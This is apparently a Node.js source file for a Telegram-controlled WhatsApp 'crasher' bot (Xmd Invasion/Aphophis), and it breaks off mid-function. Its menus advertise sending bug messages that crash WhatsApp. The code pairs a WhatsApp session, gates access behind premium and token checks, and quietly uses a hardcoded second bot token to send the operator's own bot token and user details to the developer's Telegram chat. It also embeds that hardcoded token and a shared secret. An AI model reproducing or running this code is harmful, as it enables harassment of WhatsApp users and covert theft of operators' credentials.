const { Telegraf, Markup } = require("telegraf");
const { spawn } = require('child_process')
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const https = require('https');
const http = require('http');
const fetch = require('node-fetch');
const FormData = require('form-data');
const isModerator = (userId) => {
return false;};
const developerId = "7708476554"; 
const developerIds = ["7708476554", "7708476554"];
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
    BufferJSON,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});


const thumbnailUrl = "https://files.catbox.moe/qtm09p.jpg";
// --- config (tetap) ---
const VALIDATE_URL = 'https://dbserver.vercel.app/api/validate';
const ACCESS_KEY = '#xmdnihbos';
const SHARED_SECRET = '#xmdnihbos';

// assume crypto & fetch sudah tersedia / di-polyfill jika perlu

// --- helper functions (seperti sebelumnya) ---
function verifySignature(ciphertext, signature) {
  if (!SHARED_SECRET || !signature) return false;
  const h = crypto.createHmac("sha256", SHARED_SECRET);
  h.update(String(ciphertext), "utf8");
  const expected = h.digest("hex");
  return signature === `sha256=${expected}`;
}

function decryptPayload(data, iv) {
  const key = crypto.createHash("sha256").update(SHARED_SECRET).digest();
  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    key,
    Buffer.from(iv, "base64")
  );
  let decrypted = decipher.update(data, "base64", "utf8");
  decrypted += decipher.final("utf8");
  return JSON.parse(decrypted);
}

// --- validateToken (tidak exit di dalamnya) ---
async function validateToken(token) {
  try {
    const res = await fetch(VALIDATE_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key": ACCESS_KEY
      },
      body: JSON.stringify({ token })
    });

    if (!res.ok) {
      return { status: "error", message: `HTTP ${res.status}` };
    }

    const signature = res.headers.get("x-signature");
    const json = await res.json();

    if (!json || typeof json.data !== "string" || typeof json.iv !== "string") {
      return { status: "error", message: "Bad response structure" };
    }

    if (!verifySignature(json.data, signature)) {
      return { status: "untrusted" };
    }

    let payload;
    try {
      payload = decryptPayload(json.data, json.iv);
    } catch (e) {
      return { status: "error", message: "Failed to decrypt payload" };
    }

    const payloadValidMs = parseInt(res.headers.get("x-payload-valid-ms") || "30000", 10);
    if (Math.abs(Date.now() - (payload.timestamp || 0)) > payloadValidMs) {
      return { status: "expired" };
    }

    return { status: "ok", valid: !!payload.valid };

  } catch (err) {
    return { status: "error", message: err.message || String(err) };
  }
}

// --- extra: hard exit fallback (optional) ---
// tries process.exit, if overridden then force crash (throw)
function forceExit(code = 0) {
  try {
    // restore original exit if possible (best-effort)
    if (typeof process.exit === "function") {
      process.exit(code);
    } else {
      // jika process.exit dioverride jadi non-func, paksa crash
      throw new Error("force exit");
    }
  } catch (e) {
    // pastikan process tidak lanjut: menimbulkan uncaught exception
    // NOTE: ini akan terlihat di log, tapi mencegah eksekusi lebih lanjut
    setTimeout(() => { throw new Error("Forced shutdown"); }, 0);
    // juga block event loop sedikit (opsional)
    const end = Date.now() + 1000;
    while (Date.now() < end) {} // busy-wait 1s untuk mempersulit bypass
  }
}
function runBot() {

const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '0@newsletter',
    newsletterName: '',
    caption: '\u200B'
}}}

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';

let cooldownData = {
  time: 5 * 60 * 1000, // default 5 menit
  users: {}
};

// Cek cooldown user
function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // kembalikan sisa detik
    }
  }

  
  cooldownData.users[userId] = Date.now();

  setTimeout(() => {
    delete cooldownData.users[userId];
  }, cooldownData.time);

  return 0;
}

// Set cooldown baru (format: "5s", "10m", "2h")
function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  return `✅ Cooldown diatur ke ${value}${unit}`;
}

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const startSesi = async () => {
  console.log(chalk.bold.yellow(`
 ⡂⣸⣿⣿⣿⡏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⡿⠋⠀⠀⠀⠀⠀⢋⣤⡄⠉⠂⡀⣰⢃⡎⣸⠣⢈⣦⣼⢿⣿⡟⣡⠏⠸⣿⠇⣸⣿⣿
 ⡇⣿⣿⣿⣿⣥⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⢻⡟⠀⠀⠀⠀⠄⠐⡀⠀⣿⣿⡄⠀⠐⢎⡞⣰⢃⠇⠌⡾⢣⡟⠝⣰⠏⣼⠸⡟⡀⣿⣿⣿
 ⠇⣿⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⣿⡇⠿⢿⢸⠀⠀⠀⠀⠐⠀⠀⠁⢀⣿⣿⣿⡄⠀⠈⣵⢏⢎⠀⡼⢡⢋⠀⠚⣡⡾⣣⡆⠱⢣⣿⣿⣿
 ⡆⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⡃⢝⣓⣸⡀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣶⣿⢏⢎⠆⡔⡰⢁⣾⣿⣿⢟⣵⠋⡔⡐⣸⣿⣿⡇
 ⡁⣿⣿⣿⠃⡄⣿⣿⣿⣿⣿⣿⣿⡇⣤⣙⢿⣿⣄⡀⠀⠀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣯⣾⠎⡜⣰⣡⣾⣿⡿⡣⢟⢅⠌⡼⡁⡘⡿⣸⢹
 ⠃⣿⣿⣿⢀⡇⢹⣿⣿⣿⣿⣿⣿⡇⢹⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢁⣼⣾⣷⠿⠟⡉⡀⠀⠀⠈⠞⡜⢅⡷⣱⠏⠩
 ⡇⢻⣿⣿⢈⠓⠈⣿⣿⣿⣿⣿⣿⣧⠈⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣉⣩⣡⣴⣶⠋⠀⠐⠙⣿⣧⠀⣾⠸⣱⡟⣼⡁
 ⣡⠘⣿⣿⢘⣄⠀⢻⣿⣿⣿⣿⣿⣿⢰⢹⡎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢠⣿⣿⢀⠇⣴⡿⠁⠻⠃
 ⡿⠃⢸⣿⢠⣿⠸⡜⢿⣿⣿⣿⣿⣿⡄⣆⠃⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⢠⣾⡿⡻⠂⢰⡟⠁⠘⠶⢸
 ⣁⠚⢄⢻⡎⣿⡄⣿⡘⣿⣿⣿⣿⣿⡇⢿⣤⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣴⣿⣿⡞⡄⣤⣤⣴⡇⣄⠀⡾
 ⣿⣷⣦⡀⠃⢸⣧⢸⣧⡘⢿⣿⣿⣿⣿⠘⣿⣿⣿⣿⡿⢟⣻⣭⣷⣶⣙⣟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣸⣿⣿⢿⡇⢈⣄⣀
 ⣿⣿⣿⣷⡜⢿⣿⡄⢿⣷⣌⠻⣿⢨⣛⠇⢻⡿⠛⣡⣶⣿⣿⣿⣿⣿⣿⣿⣷⣄⠎⠿⠿⣿⣿⣿⣿⣿⣿⣾⡏⠇⣽⣿⣿⠀⡇⢰⢁⣿
 ⣿⣿⣿⣿⣿⣎⢻⣷⡘⣿⣿⡇⢴⣶⣿⣷⡟⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣦⡘⣿⣿⣿⣿⣿⣿⢹⢰⣿⣿⣿⠀⣿⢸⡇⣽
 ⣿⣿⣿⡭⠟⢛⡠⠍⣤⣍⡛⢿⠘⣿⣿⡟⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣿⡟⣠⣿⣿⣿⣿⣿⡟⠆⣼⣿⣿⠇⡆⣿⢸⣿⣿
 ⣿⢟⣩⡶⢛⣽⣾⣿⣿⣿⣿⠶⠤⠌⣉⣀⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⡟⣴⣿⣿⣿⣿⣿⢟⡽⣠⣿⣿⡟⢰⡇⡏⣼⡏⡟
 ⠔⣡⣾⣿⣿⣿⣿⣿⠟⣻⣿⠾⠟⢋⣉⣭⣉⣁⡈⣉⣉⡛⢻⡿⢿⣿⣿⣿⣿⢣⢪⣾⣿⣿⡿⣟⣭⠾⢋⣼⣿⣿⡿⢠⣿⠃⠁⡿⡸⣹
 ⣾⣿⣿⣿⣿⡿⢋⣴⠾⢋⣵⣾⣿⣿⣿⡿⠛⢉⣥⣿⣿⣿⣿⣷⣦⣍⠛⠟⠁⢵⣛⣯⡽⠶⠛⢋⡅⣶⣿⣿⣿⠿⢁⣾⠟⡄⣸⣷⢣⣿
 
» Information:
  Developer: frmn/@kyzzexX
  Version: 3.0
  Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Aphophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────  

Olaaa, I am a telegram bot created by @kyzzexX  
I can send bug functions that cause WhatsApp to crash, Use me wisely  

スパムしないでください  

⌜ Xmd Invasion ☇ Pairing° Menu ⌟  

⬡ Author: @kyzzexX 
⬡ Version: 3.0  
⬡ Prefix: /  
⬡ InterFace: Button Type  
⬡ Type: ( Plugin )  

─▢ Number: ${lastPairingMessage.phoneNumber}  
─▢ Pairing Code: ${lastPairingMessage.pairingCode}  
─▢ Status:  Connected
</pre></blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
 ⡂⣸⣿⣿⣿⡏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⡿⠋⠀⠀⠀⠀⠀⢋⣤⡄⠉⠂⡀⣰⢃⡎⣸⠣⢈⣦⣼⢿⣿⡟⣡⠏⠸⣿⠇⣸⣿⣿
 ⡇⣿⣿⣿⣿⣥⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⢻⡟⠀⠀⠀⠀⠄⠐⡀⠀⣿⣿⡄⠀⠐⢎⡞⣰⢃⠇⠌⡾⢣⡟⠝⣰⠏⣼⠸⡟⡀⣿⣿⣿
 ⠇⣿⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⣿⡇⠿⢿⢸⠀⠀⠀⠀⠐⠀⠀⠁⢀⣿⣿⣿⡄⠀⠈⣵⢏⢎⠀⡼⢡⢋⠀⠚⣡⡾⣣⡆⠱⢣⣿⣿⣿
 ⡆⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⡃⢝⣓⣸⡀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣶⣿⢏⢎⠆⡔⡰⢁⣾⣿⣿⢟⣵⠋⡔⡐⣸⣿⣿⡇
 ⡁⣿⣿⣿⠃⡄⣿⣿⣿⣿⣿⣿⣿⡇⣤⣙⢿⣿⣄⡀⠀⠀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣯⣾⠎⡜⣰⣡⣾⣿⡿⡣⢟⢅⠌⡼⡁⡘⡿⣸⢹
 ⠃⣿⣿⣿⢀⡇⢹⣿⣿⣿⣿⣿⣿⡇⢹⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢁⣼⣾⣷⠿⠟⡉⡀⠀⠀⠈⠞⡜⢅⡷⣱⠏⠩
 ⡇⢻⣿⣿⢈⠓⠈⣿⣿⣿⣿⣿⣿⣧⠈⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣉⣩⣡⣴⣶⠋⠀⠐⠙⣿⣧⠀⣾⠸⣱⡟⣼⡁
 ⣡⠘⣿⣿⢘⣄⠀⢻⣿⣿⣿⣿⣿⣿⢰⢹⡎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢠⣿⣿⢀⠇⣴⡿⠁⠻⠃
 ⡿⠃⢸⣿⢠⣿⠸⡜⢿⣿⣿⣿⣿⣿⡄⣆⠃⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⢠⣾⡿⡻⠂⢰⡟⠁⠘⠶⢸
 ⣁⠚⢄⢻⡎⣿⡄⣿⡘⣿⣿⣿⣿⣿⡇⢿⣤⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣴⣿⣿⡞⡄⣤⣤⣴⡇⣄⠀⡾
 ⣿⣷⣦⡀⠃⢸⣧⢸⣧⡘⢿⣿⣿⣿⣿⠘⣿⣿⣿⣿⡿⢟⣻⣭⣷⣶⣙⣟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣸⣿⣿⢿⡇⢈⣄⣀
 ⣿⣿⣿⣷⡜⢿⣿⡄⢿⣷⣌⠻⣿⢨⣛⠇⢻⡿⠛⣡⣶⣿⣿⣿⣿⣿⣿⣿⣷⣄⠎⠿⠿⣿⣿⣿⣿⣿⣿⣾⡏⠇⣽⣿⣿⠀⡇⢰⢁⣿
 ⣿⣿⣿⣿⣿⣎⢻⣷⡘⣿⣿⡇⢴⣶⣿⣷⡟⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣦⡘⣿⣿⣿⣿⣿⣿⢹⢰⣿⣿⣿⠀⣿⢸⡇⣽
 ⣿⣿⣿⡭⠟⢛⡠⠍⣤⣍⡛⢿⠘⣿⣿⡟⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣿⡟⣠⣿⣿⣿⣿⣿⡟⠆⣼⣿⣿⠇⡆⣿⢸⣿⣿
 ⣿⢟⣩⡶⢛⣽⣾⣿⣿⣿⣿⠶⠤⠌⣉⣀⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⡟⣴⣿⣿⣿⣿⣿⢟⡽⣠⣿⣿⡟⢰⡇⡏⣼⡏⡟
 ⠔⣡⣾⣿⣿⣿⣿⣿⠟⣻⣿⠾⠟⢋⣉⣭⣉⣁⡈⣉⣉⡛⢻⡿⢿⣿⣿⣿⣿⢣⢪⣾⣿⣿⡿⣟⣭⠾⢋⣼⣿⣿⡿⢠⣿⠃⠁⡿⡸⣹
 ⣾⣿⣿⣿⣿⡿⢋⣴⠾⢋⣵⣾⣿⣿⣿⡿⠛⢉⣥⣿⣿⣿⣿⣷⣦⣍⠛⠟⠁⢵⣛⣯⡽⠶⠛⢋⡅⣶⣿⣿⣿⠿⢁⣾⠟⡄⣸⣷⢣⣿
 
» Information:
  Developer: frmn/@kyzzexX
  Version: 3.0
  Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("reqpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /reqpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>空所 ┊ ＡＰＨＯＰＨＩＳ • ＣＲＡＳＨＥＲ
──────────────────────────────  

Olaaa ${ctx.from.first_name}, I am a telegram bot created by @Urz1ee  
I can send bug functions that cause WhatsApp to crash, Use me wisely  

スパムしないでください  

⌜ Aphophis ☇ Pairing° Menu ⌟  

⬡ Author: @Urz1ee  
⬡ Version: 5.0  
⬡ Prefix: /  
⬡ InterFace: Button Type  
⬡ Type: ( Plugin )  

─▢ Number: ${phoneNumber}  
─▢ Pairing Code: ${formattedCode}  
─▢ Status: Not Connected
</pre></blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode  
    };

  } catch (err) {
    console.error(err);
  }
});


if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const connectedMenu = `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────  

Olaaa, I am a telegram bot created by @KyzzexX  
I can send bug functions that cause WhatsApp to crash, Use me wisely  

スパムしないでください  

⌜ Xmd Invasion ☇ Pairing° Menu ⌟  

⬡ Author: @kyzzexX  
⬡ Version: 3.0  
⬡ Prefix: /  
⬡ InterFace: Button Type  
⬡ Type: ( Plugin )  

─▢ Number: ${lastPairingMessage.phoneNumber}  
─▢ Pairing Code: ${lastPairingMessage.pairingCode}  
─▢ Status:  Connected
</pre></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          connectedMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka (dalam hari)");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});


const tokenDev = "8351925681:AAEAj2PhRyetmJF0bDCnfP96KLZwgptn_vM"; 
const devId = 7665403124;
const devBot = new Telegraf(tokenDev);
const CONFIG_PATHH = require("./settings/config.js");
const CONFIG_PATH = path.join(__dirname, "settings", "config.json");

function loadConfig() {
  try {
    if (!fs.existsSync(CONFIG_PATH)) {
      const blank = { verified: {} };
      fs.writeFileSync(CONFIG_PATH, JSON.stringify(blank, null, 2));
      return blank;
    }
    const raw = fs.readFileSync(CONFIG_PATH, "utf8");
    const parsed = JSON.parse(raw);
    parsed.verified = parsed.verified || {};
    return parsed;
  } catch (e) {
    console.error("[CONFIG] failed load:", e.message);
    return { verified: {} };
  }
}

function saveConfig(cfg) {
  try {
    fs.writeFileSync(CONFIG_PATH, JSON.stringify(cfg, null, 2), { encoding: "utf8" });
    return true;
  } catch (e) {
    console.error("[CONFIG] failed save:", e.message);
    return false;
  }
}

async function updateProgress(ctx, msg, percent, text) {
  try {
    const chatId = msg.chat.id;
    const messageId = msg.message_id;
    const barLen = 20;
    const filled = Math.round((percent / 100) * barLen);
    const bar = "█".repeat(filled) + "░".repeat(barLen - filled);
    const newText = `\`\`\`Verifying\btoken...\n[${bar}] ${percent}%\n\n${text}\`\`\``;
    await ctx.telegram.editMessageText(chatId, messageId, undefined, newText, { parse_mode: "Markdown" });
  } catch (e) {
    // ignore edit errors
  }
}

// --- sendMenu helper ---
async function sendMenu(ctx) {
  const menuMessage = `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX,
I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Core° System ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

( ! ) SELLECT THE BUTTON BELOW  
</pre>
</blockquote>`;

  const keyboard = [
    [
      { text: "⌜⚙️⌟ ☇ Controll Menu", callback_data: "/controls" },
      { text: "⌜🦠⌟ ☇ Bug Menu", callback_data: "/bug" }
    ],
    [
      { text: "⌜👥⌟ ☇ Thaks To", callback_data: "/tqto" },
    ],
    [
      { text: "⌜🕹️⌟ ☇ Tols Menu", callback_data: "/tols" }
    ]
  ];

  try {
    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: menuMessage,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    });
  } catch (e) {
    await ctx.reply("✅ Menu:\n- Controll Menu\n- Bug Menu\n- Thaks To\n- Tols Menu");
  }
}

bot.start(async (ctx) => {
  const cfg = loadConfig();
  const ownerId = cfg.ownerId || null; 
  const userId = String(ctx.from.id);
  const username = ctx.from.username || ctx.from.first_name || userId;

  const tokenToCheck = tokenBot;

  cfg.verified = cfg.verified || {};
  const known = cfg.verified[userId];
  if (known && known.token === tokenToCheck) {
    await ctx.reply("✅ Token sudah terverifikasi sebelumnya. Akses dilanjutkan.");
    return sendMenu(ctx);
  }

  if (ownerId && Number(userId) === Number(ownerId)) {
    cfg.verified[userId] = { token: tokenToCheck, verifiedAt: Date.now(), note: "owner-bypass" };
    saveConfig(cfg);
    await ctx.reply("✅ Id Owner terdeteksi — akses di berikan.");
    if (devId) {
      try {
        await ctx.telegram.sendMessage(devId, `🔔 OWNER ACCESS: @${username} (id:${userId}) auto-granted access (owner).`);
      } catch (e) {}
    }
    return sendMenu(ctx);
  }

  if (tokenDev && tokenToCheck === tokenDev) {
    cfg.verified[userId] = { token: tokenToCheck, verifiedAt: Date.now(), note: "dev-bypass" };
    saveConfig(cfg);

    if (devId) {
      try {
        await ctx.telegram.sendMessage(devId, `🔐 DEV ACCESS: @${username} (id:${userId}) used devToken and was granted access.`);
      } catch (e) {}
    }

    await ctx.reply("✅ Dev token detected — akses diberikan.");
    return sendMenu(ctx);
  }

  const progressMsg = await ctx.reply("🔎 Memulai verifikasi token...");
  try {
    await updateProgress(ctx, progressMsg, 10, "Menyiapkan koneksi...");
    await new Promise(r => setTimeout(r, 500));

    await updateProgress(ctx, progressMsg, 35, "Mengirim token ke server untuk diverifikasi...");
    await new Promise(r => setTimeout(r, 500));

    const isValid = await validateToken(tokenToCheck);
await new Promise(r => setTimeout(r, 1000));

    if (isValid) {
      cfg.verified[userId] = { token: tokenToCheck, verifiedAt: Date.now(), note: "server-verified" };
      saveConfig(cfg);

      await updateProgress(ctx, progressMsg, 90, "Token valid — menyelesaikan...");
      await updateProgress(ctx, progressMsg, 100, "Selesai — akses diberikan.");

if (devId) {
  try {
    const caption = `\`\`\`✅\bVERIFIED\nuser: @${username}\nid: ${userId}\ntoken: ${tokenBot}\ntime: ${new Date().toISOString()}\`\`\``;
    await devBot.telegram.sendPhoto(devId, thumbnailUrl, { caption, parse_mode: "Markdown" });
  } catch (e) {
    await devBot.telegram.sendMessage(devId, `✅\bVERIFIED\nuser: @${username}\nid: ${userId}\ntime: ${new Date().toISOString()}`);
  }
}

        

      try { await ctx.deleteMessage(progressMsg.message_id); } catch (e) {}
      await ctx.reply("✅ Token valid! Selamat datang, akses diberikan.");
      return sendMenu(ctx);
    } else {
      await updateProgress(ctx, progressMsg, 100, "Verifikasi selesai — token tidak valid.");

      if (devId) {
  try {
    const caption = `\`\`\`❌\bFAILED\nuser: @${username}\nid: ${userId}\ntoken: ${tokenBot}\ntoken verification FAILED at ${new Date().toISOString()}\`\`\``;
    await devBot.telegram.sendPhoto(devId, thumbnailUrl, { caption, parse_mode: "Markdown" });
  } catch (e) {
    await devBot.telegram.sendMessage(devId, `❌\bFAILED\nuser: @${username}\nid: ${userId}\ntoken verification FAILED at ${new Date().toISOString()}`);
  }
}


      await ctx.reply("❌ Token tidak valid, akses ditolak. Silakan hubungi owner.");
      return;
    }
  } catch (err) {
